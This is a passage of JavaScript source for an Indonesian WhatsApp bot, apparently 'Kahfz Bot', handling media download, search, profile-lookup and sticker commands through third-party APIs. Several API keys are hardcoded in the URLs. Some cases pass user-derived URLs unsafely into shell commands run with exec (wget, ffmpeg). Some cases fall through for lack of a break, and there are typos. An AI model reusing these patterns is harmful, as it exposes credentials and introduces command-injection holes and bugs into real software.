 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
 kahfzz.relayWAMessage(prep)



 break

 case 'loli':
 case 'husbu':
 case 'milf':
 case 'cosplay':
 case 'wallml':
  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://kahfzz-chan02.github.io`)
  let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
  let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
  fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
  buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
  imageMsg = ( await kahfzz.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
  buttonsMessage = {footerText:'Kahfz Bot', imageMessage: imageMsg,
  contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  fs.unlinkSync(`./${sender}.jpeg`)
  break
  case 'playy':
  case 'lagu':
  if (args.length < 1) return reply('Apa Yang Mau Dicari?')
 teks = args.join(' ')
  reply(mess.wait)
  if (!teks.endsWith("-doc")){
 res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
 })
 reply(` Playing ${res.all[0].title}`)
 let thumbInfo = ` *Youtube Search*
 *🐥 Judul :* ${res.all[0].title}
 *🐣 ID Video :* ${res.all[0].videoId}
 *🐤 Diupload Pada :* ${res.all[0].ago}
 *🐥 Views :* ${res.all[0].views}
 *🐣 Durasi :* ${res.all[0].timestamp}
 *🐤 Channel :* ${res.all[0].author.name}
 *🔗 Link Channel :* ${res.all[0].author.url}

 *File Sedang Di Kirim........*
 `
/////////////sendFileFromUrl(res.all[0].image, image, {quoted: freply, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
  reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: freply, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
  const tec = teks.split("-doc")
  res = await yts(`${tec}`).catch(e => {
 reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
  })
  reply(`.Playing ${res.all[0].title}`)
  let thumbInfo = `*${botName}* 
  *Judul :* ${res.all[0].title}
  *ID Video :* ${res.all[0].videoId}
  *Diupload Pada :* ${res.all[0].ago}
  *Views :* ${res.all[0].views}
  *Durasi :* ${res.all[0].timestamp}
  *Channel :* ${res.all[0].author.name}
  *Link Channel :* ${res.all[0].author.url}

  *_Tunggu Proses Upload....._*
  `
  sendFileFromUrl(res.all[0].image, image, {quoted: freply, caption: thumbInfo})
  res = await y2mateA(res.all[0].url).catch(e => {
 reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
  })
  sendFileFromUrl(res[0].link, document, {quoted: freply, mimetype: 'audio/mp3', filename: res[0].output})
}
break
case 'play2':
if (args.length < 1) return reply('*Masukan judul nya?*')
  reply('Loading.... ')
play = args.join(" ")
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=apivinz`)
if (anu.error) return reply(anu.error)
  infomp3 = `*「 PLAY VIDEO 」*

Judul : ${anu.result.title}
Source : ${anu.result.source}

*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				kahfzz.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Nih Gan'})
 break  

 case 'ytdl':
 case 'play':
			  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://kahfzz-chan02.github.io`)
  if (!q) return reply('Linknya?')
 res = await yts(q)
  let thumbInfo = ` 
  *Youtube Download*
  *🐥 Judul :* ${res.all[0].title}
  *🐣 ID Video :* ${res.all[0].videoId}
  *🐤 Diupload Pada :* ${res.all[0].ago}
  *🐥 Views :* ${res.all[0].views}
  *🐣 Durasi :* ${res.all[0].timestamp}
  *🐤 Channel :* ${res.all[0].author.name}
  *🔗 Link Channel :* ${res.all[0].author.url}

  *Silahkan pilih media yang akan di download*
  `
  buttons = [{buttonId:`${prefix}play2 ${q}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`${prefix}playy ${q}`,buttonText:{displayText:'🎵AUDIO'},type:1}]

  imageMessage = (await kahfzz.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage

  buttonsMessage = {contentText: thumbInfo,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}

  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})

  kahfzz.relayWAMessage(prep)
  break

  case 'lirik':
  if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
 query = args.join(" ")
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=Mythia-Chan&query=${query}`)
  reply(get_result.result)

  break
  case 'pinterest':
  if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
 query = args.join(" ")
  reply (mess.wait)
  ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=Mythia-Chan&query=${query}`)
  ini_url = ini_url.result
  buff = await getBuffer(ini_url)
  buttons = [{buttonId: `${prefix + command} ${query}`,buttonText:{displayText: `➡️Next`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'Kahfz Bot', imageMessage: imageMsg,
  contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break

  case 'shopee':
  try {
if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
  query = args.join(" ")
reply(mess.wait)
get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${setting.zekskey}&q=${query}`)
get_data = get_data.data
teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE* 
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_data.length; i++) {
 teks += `\`\`\`🐥 Nama : ${get_data[i].name}\`\`\`
 \`\`\`🐥 Harga : ${get_data[i].harga}\`\`\`
 \`\`\`🐥 Terjual : ${get_data[i].terjual}\`\`\`
 \`\`\`🐥 Lokasi : ${get_data[i].location}\`\`\`
 \`\`\`🐥 Deskripsi*: ${get_data[i].desc}\`\`\`
 \`\`\`?? Stok : ${get_data[i].stock}\`\`\`
 \`\`\`🐥 Informasi : ${get_data[i].information}\`\`\`
 \`\`\`🐥 Link : ${get_data[i].url}\`\`\``
  }
  ini_buffer = await getBuffer(get_data[0].img_detail[0])
  kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply, caption: teks })
} catch {
  reply(`Maaf produk ${query} tidak ditemukan`)
}
break
case 'playstore':
try {
  if (args.length == 0) return reply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)
 query = args.join(" ")
  reply(mess.wait)
  get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${setting.zekskey}&q=${query}`)
  get_result = get_result.result
  teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
  ┆ *PLAYSTORE*
  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

  *Data Berhasil Didapatkan!*\n`
  for(let i = 0; i < get_result.length; i++) {
 teks += `\`\`\`🐥 Title : ${get_result[i].title}\`\`\`
 \`\`\`🐥 Harga : ${get_result[i].price}\`\`\`
 \`\`\`🐥 Rate : ${get_result[i].rating}\`\`\`
 \`\`\`🐥 Link : ${get_result[i].url}\`\`\`

 `
  }
  ini_buffer = await getBuffer(get_result[0].thumb)
  kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply, caption: teks })
} catch {
  reply(`Maaf aplikasi ${query} tidak ditemukan`)
}
break
case 'yts':
case 'ytsearch':
if (!q) return reply(mess.wrongFormat)
  reply(mess.wait)
try {
  res = await yts(q)
  a = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
  ┆ *YOUTUBE SEARCH*
  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

  *Data Berhasil Didapatkan!*\n`
  for (let i of res.all) {
 a += `\`\`\`🐣 Title : ${i.title}\`\`\`
 \`\`\`🐤 Views : ${i.views}\`\`\`
 \`\`\`🐣 Upload : ${i.ago}\`\`\`
 \`\`\`🐥 Durasi : ${i.timestamp}\`\`\`
 \`\`\`🐤 Channel : ${i.author.name}\`\`\`
 \`\`\`🔗 Link : ${i.url}\`\`\``
  }
  b = a.trim()
  sendFileFromUrl(res.all[0].image, image, {quoted: freply, caption: b})
} catch (e) {
 console.log(e)
 reply(`${e}`)
  }
  break
  case 'tourl':
  if ((isMedia && !kahfz.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
 reply(mess.wait)
 boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
 owgi = await kahfzz.downloadMediaMessage(boij)
 res = await uploadImages(owgi)
 reply(res)
  } else {
 reply('kirim/reply gambar/video')
  }
  break

  case 'imgtourl':
  case 'img2url':
  reply(mess.wait) 
  var imgbb = require('imgbb-uploader')
  var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
  var media = await  kahfzz.downloadAndSaveMediaMessage(encmedia) 
  imgbb('67bb63bdcb5c234b7aba60c618a2b903', media)
  .then(data => {
 var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
 ibb = fs.readFileSync(media)
 kahfzz.sendMessage(from, ibb, image, { quoted: freply, caption: caps})
  })
  .catch(err => {
 throw err
  })
  break
case 'asupan': // shansekai
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
  reply(mess.wait)
asupan()
.then(async (body) => {
  asupann = body.split('\n')
  asupanx = asupann[Math.floor(Math.random() * asupann.length)]
  sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, 'Follow IG: https://www.instagram.com/ptl_repost untuk mendapatkan asupan lebih banyak.')
  console.log('Success sending video!')
})
.catch(async (err) => {
  console.log(err)
  reply(`${err}`)
})
break
case 'nulis':
case 'tulis':
if (args.length < 1) return reply('Yang mau di tulis apaan?')
  teks = args.join(' ')
reply(mess.wait)
nulis = encodeURIComponent(teks)
res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
if (res.data.error) return reply(res.data.error)
  buff = Buffer.from(res.data.result.split(',')[1], 'base64')
kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: mess.success}).catch(e => {
  return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
break
//------------------< Level >-------------------
case 'level': 
if (!isGroup) return reply(mess.only.group)
  if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
 let userLevel = level.getLevelingLevel(sender, _level)
  let userXp = level.getLevelingXp(sender, _level)
  let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
  let userRank = level.getUserRank(sender, _level)
  try {
 profilePic = await kahfzz.getProfilePicture(sender)
  } catch {
 profilePic = errorImg
  }
  buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/rank?apikey=Mythia-Chan&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
  teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
  buttons = [{ buttonId: `${prefix}mining`, buttonText: { displayText: 'MINING' }, type: 1 },{ buttonId: `${prefix}leaderboard`, buttonText: { displayText: 'LEADEBOARD' },type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
  buttonsMessage = {footerText:'Kahfz Bot✓', imageMessage: imageMsg,
  contentText:`${teks}`,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
 case 'leaderboard': //Cek Leaderboard
 case 'leaderboards':
 if (!isGroup) return reply(mess.only.group)
  if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!') 
 const resp = _level
  _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
  let leaderboard =  '-----[ *LEADERBOARD* ]----\n\n'
  try {
 for (let i = 0; i < 10; i++) {
var roles = 'Warrior III'
if (resp[i].level <= 5) {
  roles = 'Warrior II'
} else if (resp[i].level <= 10) {
  roles = 'Warrior I'
} else if (resp[i].level <= 15) {
  roles = 'Elite III'
} else if (resp[i].level <= 20) {
  roles = 'Elite II'
} else if (resp[i].level <= 25) {
  roles = 'Elite I'
} else if (resp[i].level <= 30) {
  roles = 'Master III'
} else if (resp[i].level <= 35) {
  roles = 'Master II'
} else if (resp[i].level <= 40) {
  roles = 'Master I'
} else if (resp[i].level <= 45) {
  roles = 'GrandMaster III'
} else if (resp[i].level <= 50) {
  roles = 'GrandMaster II'
} else if (resp[i].level <= 55) {
  roles = 'GrandMaster I'
} else if (resp[i].level <= 60) {
  roles = 'Epic III'
} else if (resp[i].level <= 65) {
  roles = 'Epic II'
} else if (resp[i].level <= 70) {
  roles = 'Epic I'
} else if (resp[i].level <= 75) {
  roles = 'Legend III'
} else if (resp[i].level <= 80) {
  roles = 'Legend II'
} else if (resp[i].level <= 85) {
  roles = 'Legend I'
} else if (resp[i].level <= 90) {
  roles = 'Mythic'
} else if (resp[i].level <= 95) {
  roles = 'Mythical Glory'
} else if (resp[i].level >= 100) {
  roles = 'Immortal'
} 

leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role :* ${roles}\n\n`
 }
 reply(leaderboard)
  } catch (err) {
 console.error(err)
 reply('_Perlu setidaknya 10 user yang memiliki level di database!_')
  }
  break
//------------------< Stalk >-------------------
case 'stalkgithub':
case 'githubstalk':
if (args.length == 0) return reply(`Example: ${prefix + command} kahfzz-chan02`)
  reply(mess.wait)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=Mythia-Chan`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.avatar)
ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Username : ${ini_result.name}\`\`\`
\`\`\`🐥 Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`🐥 Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`🐥 Pengikut : ${ini_result.followers}\`\`\`
\`\`\`🐥 Following : ${ini_result.following}\`\`\`
\`\`\`🐥 Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`🐥 Link : ${ini_result.url}\`\`\`
`
kahfzz.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
break
case 'stalkig':
case 'igstalk':
if (args.length == 0) return reply(`Example: ${prefix + command} kahfzz.chan26`)
 reply(mess.wait)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=Mythia-Chan`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.photo_profile)
ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Username : ${ini_result.username}\`\`\`
\`\`\`🐥 Nama : ${ini_result.fullname}\`\`\`
\`\`\`🐥 Pengikut : ${ini_result.followers}\`\`\`
\`\`\`🐥 Mengikuti : ${ini_result.following}\`\`\`
\`\`\`🐥 Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`🐥 Link : https://instagram.com/${ini_result.username}\`\`\`
`
kahfzz.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
break
case 'stalktiktok':
case 'tiktokstalk':
if (args.length == 0) return reply(`Example: ${prefix + command} marz.hiatus`)
 reply(mess.wait)
stalk_toktok = args[0]
get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=Mythia-Chan`)
get_result = get_result.result
pp_tt = await getBuffer(get_result.user_picture)
ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Username : ${get_result.username}\`\`\`
\`\`\`🐥 Nama : ${get_result.nickname}\`\`\`
\`\`\`🐥 Pengikut : ${get_result.followers}\`\`\`
\`\`\`🐥 Mengikuti : ${get_result.followings}\`\`\`
\`\`\`🐥 Likes : ${get_result.likes}\`\`\`
\`\`\`🐥 Video : ${get_result.video}\`\`\`
\`\`\`🐥 Deskripsi : ${get_result.bio}\`\`\`
`
kahfzz.sendMessage(from, pp_tt, image, { quoted: freply, caption: ini_txt, thumbnail: Buffer.alloc(0) })
break
case 'iguser':
try {
  if (args.length == 0) return reply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
 query = args.join(" ")
  reply(mess.wait)
  get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${setting.zekskey}&q=${query}`)
  get_result = get_result.result
  teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
  for(let i = 0; i < get_result.length; i++) {
 teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
  }
  ini_buffer = await getBuffer(get_result[0].profile_pic)
  kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply, caption: teks })
} catch {
  reply(`Maaf username ${query} tidak ditemukan`)
}
break
//------------------< Sticker/Tools >-------------------

 case 'dadu': // by CHIKAA CHANTEKKXXZZ
 reply(mess.wait)
 dadu()
 .then(async (body) => {
  dadugerak = body.split('\n')
  dadugerakx = dadugerak[Math.floor(Math.random() * dadugerak.length)]
  sendWebp(from, dadugerakx)
})
 .catch(async (err) => {
  console.error(err)
  reply('Error!')
})
 break
 case 'doge':
 reply(mess.wait)
 fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
 .then(res => res.text())
 .then(body => {
  let tod = body.split("\n");
  let pjr = tod[Math.floor(Math.random() * tod.length)];
  sendWebp(from, pjr)
}
)
 break
 case 'linkgc':
 case 'link':
 case 'linkgroup':
 linkgc = await kahfzz.groupInviteCode(from)
 reply('https://chat.whatsapp.com/'+linkgc)
 case 'patrick':
 reply(mess.wait)
 fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
 .then(res => res.text())
 .then(body => {
  let tod = body.split("\n");
  let pjr = tod[Math.floor(Math.random() * tod.length)];
  sendWebp(from, pjr)
}
)
 break
 case 'gura':
 case 'gawgura':
 reply(mess.wait)
 fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
 .then(res => res.text())
 .then(body => {
  let tod = body.split("\n");
  let pjr = tod[Math.floor(Math.random() * tod.length)];
  sendWebp(from, pjr)
}
)
 break
 case 'animestick':
 case 'stickeranime':
 reply(mess.wait)
 fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
 .then(res => res.text())
 .then(body => {
  let todd = body.split("\n");
  let pjrr = todd[Math.floor(Math.random() * todd.length)];
  sendWebp(from, pjrr)
}
)
 break
 case 'telesticker': 
 case 'telestiker':
 if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
  reply(mess.wait)
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=Mythia-Chan&url=${args[0]}`)
ini_sticker = ini_url.result.sticker
reply('Sending '+ ini_sticker.length +' stickers...')
for (sticker_ in ini_sticker) {
  ini_buffer = await getBuffer(ini_sticker[sticker_])
  kahfzz.sendMessage(from, ini_buffer, sticker, {})
}
break
case 'semoji':
case 'emoji':
if (args.length == 0) return reply(`Example: ${prefix + command} ðŸ˜­`)
  emoji = args[0]
try {
  emoji = encodeURI(emoji[0])
} catch { 
  emoji = encodeURI(emoji)
}
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=IkyChan`)
await kahfzz.sendMessage(from, ini_buffer, sticker, { quoted: freply })
break
case 'semoji2':
case 'emoji2':
if (args.length == 0) return reply(`Example: ${prefix + command} ðŸ˜­`)
  emoji = args[0]
try {
  emoji = encodeURI(emoji[0])
} catch { 
  emoji = encodeURI(emoji)
}
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji3/${emoji}?apikey=IkyChan`)
await kahfzz.sendMessage(from, ini_buffer, sticker, { quoted: freply })
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':

if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
  ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${setting.lolkey}&text=${ini_txt}`)
await kahfzz.sendMessage(from, ini_buffer, sticker, { quoted: freply })
break

case 'stikertahta':
case 'stt': 
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
  ajgg = args.join(" ")
reply('wait....')
meki = `https://leyscoders-api.herokuapp.com/api/harta-tahta?text=${encodeURI(q)}&apikey=IkyOgiwara`
sendStickerUrl(from, meki, { quoted: freply})
break

case 'attp':
if (args.length == 0) return reply(`Example: ${prefix + command} kahfzz`)
  buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
kahfzz.sendMessage(from, buffer, sticker, { quoted: freply })
break

case 'sfire2': 

reply('Loading.... ')
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
tolink = await uptotele(media)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = await getBuffer (`https://api.zeks.xyz/api/burning-image?apikey=Mythia-Chan&image=${tolink}`)
sendStickerUrl(from, `${anu1}`)

break
case 'tgg': 

reply('Loading.... ')
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
tolink = await uptotele(media)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${tolink}`
sendStickerUrl(from, `${anu1}`)

break
case 'sf':
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
tolink = await uptotele(media)
ranp = getRandom('.gif')
rano = getRandom('.webp')
reply(mess.wait)

pjr = await getBuffer(`https://api.zeks.xyz/api/burning-image?apikey=Mythia-Chan&image${encodeURI(tolink)}`)
kahfzz.sendMedsage(from , pjr , sticker, {quoted: kahfz})


break
case 'tggg': 

reply('Loading.... ')
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
tolink = await uptotele(media)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.lolhuman.xyz/api/editor/triggered?apikey=Mythia-Chan&img=${tolink}`
sendStickerUrl(from, `${anu1}`)

break
case 'triggered3':
ini_url = args[0]

ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/editor/triggered?apikey=Mythia-Chan&img=${ini_url}`)

kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply })
break
case 'sfiree':

if (isImage || isQuotedImage) {
  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
  let media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  var tolink = await uptotele(media)
  let ane = await getBuffer(`https://api.zeks.xyz/api/burning-image?apikey=Mythia-Chan&image=${tolink}`)
  fs.writeFileSync('./sticker/triggered.webp', ane)
  exec(`webpmux -set exif ./sticker/data.exif ./sticker/triggered.webp -o ./sticker/triggered.webp`, async (error) => {
 if (error) return reply(mess.error.api)
kahfzz.sendMessage(from, fs.readFileSync(`./sticker/triggered.webp`), sticker, {quoted: freply})

 fs.unlinkSync(`./sticker/triggered.webp`)	
  })
}

break 
case "triggered":
case 'tiger':
if (isImage || isQuotedImage) {
 var lin = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
 var dow = await kahfzz.downloadAndSaveMediaMessage(kahfz)
 var tolink = await uptotele(dow)
 ranp = getRandom('.gif')
 rano = getRandom('.webp')
 var ini_buffer = `https://api.lolhuman.xyz/api/editor/triggered?apikey=Mythia-Chan&img=${tolink}`
 exec(`wget "${ini_buffer}" -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
  fs.unlinkSync(ranp)
  kahfzz.sendMessage(from, fs.readFileSync(rano), sticker, { quoted: kahfz }).then(() => {
 fs.unlinkSync(rano)
  })
})
  } else {
 reply("only foto")
  }
  break
  case 'stickernobg': case 'stikernobg': case 'snobg': case 'removebg': case 'nobg':

  if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: kahfz
let media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
var file_name = getRandom('.png')
var file_name2 = getRandom('.webp')
request({
  url: `https://api.lolhuman.xyz/api/removebg?apikey=${setting.lolkey}`,
  method: 'POST',
  formData: {
 "img": fs.createReadStream(media)
  },
  encoding: "binary"
}, async function(error, response, body) {
  fs.unlinkSync(media)
  fs.writeFileSync(file_name, body, "binary")
  await ffmpeg(`./${file_name}`)
  .input(file_name)
  .on('start', function (cmd) {
 console.log(`Started : ${cmd}`)
  })
  .on('error', function(err) {
 console.log(err)
 reply(mess.error.api)
 fs.unlinkSync(file_name)
  })
  .on('end', function() {
 console.log('Finish')
 exec(`webpmux -set exif ./sticker/data.exif ./${file_name2} -o ./${file_name2}`, async (error) => {
if (error) return reply(mess.error.api)
 kahfzz.sendMessage(from, fs.readFileSync(file_name2), sticker, {quoted: kahfz})

  fs.unlinkSync(file_name)
  fs.unlinkSync(file_name2)
})
  })
  .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
  .toFormat('webp')
  .save(file_name2)
});
 } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
var ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
  fs.unlinkSync(media)
  if (err) return reply('Gagal :V')
 var file_name = getRandom('.png')
  var file_name2 = getRandom('.webp')
  request({
 url: `https://api.lolhuman.xyz/api/removebg?apikey=${setting.olkey}`,
 method: 'POST',
 formData: {
"img": fs.createReadStream(ran)
 },
 encoding: "binary"
  }, async function(error, response, body) {
 fs.unlinkSync(ran)
 fs.writeFileSync(file_name, body, "binary")
 await ffmpeg(`./${file_name}`)
 .input(file_name)
 .on('start', function (cmd) {
console.log(`Started : ${cmd}`)
 })
